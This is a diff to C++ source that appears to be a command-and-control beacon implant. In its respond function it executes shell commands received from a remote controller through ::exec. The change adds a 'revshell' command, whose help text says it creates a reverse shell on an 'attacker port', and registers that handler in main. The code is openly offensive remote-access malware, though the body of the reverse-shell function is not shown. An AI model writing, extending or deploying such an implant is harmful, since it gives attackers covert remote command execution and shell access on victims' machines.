@@ -16,7 +16,6 @@ using json = nlohmann::json;
 
 Cmdline cmdline("","");
 
-
 Beacon::Beacon(int bid, int bport, const char *b_attached_to)
 {
     id = bid;
@@ -95,13 +94,32 @@ std::string Beacon::respond(std::string buf){
     }
     /// COMMAND LINE EXECUTION GOES HERE ///
     std::string cmd = update["cmd"];
-    cout = ::exec(cmd.c_str());
+    // Check if command exists in cmdline
+
+    auto [result, op] = cmdline.accept(cmd);
+    switch(result){
+        case 1:
+            cout = "invalid parameter(s) for " + op + ".\nrevshell <LPORT> : create reverse shell on attacker port <LPORT>";
+            status = 300;
+            break;
+        case 101:
+            cout = "unable to initiate reverse shell: port in use";
+            status = 300;
+            break;
+        case -1:
+            cout = ::exec(cmd.c_str());
+            break;
+    }
     ////////////////////////////////////////
     return set_update(status, cout, alive, persistent);
 }
 
 bool Beacon::establish(){
     return false;
+}
+
+const char *Beacon::get_ip(){
+    return attached_to;
 }
 
 std::string Beacon::set_update(int status, std::string cout, bool alive, bool persistent){
@@ -118,9 +136,14 @@ std::string Beacon::set_update(int status, std::string cout, bool alive, bool pe
     return k;
 }
 
+const char* get_ip_addr(){
+    return beacon_ip_addr;
+}
+
+Beacon beacon(beacon_id, beacon_port, beacon_ip_addr);
+
 int main()
 {
-    Beacon beacon(beacon_id, beacon_port, beacon_ip_addr);
-    cmdline.sethelp("help","display this help message");
+    cmdline.setcmd("revshell","","",revshell);
     beacon.await_update();
 }
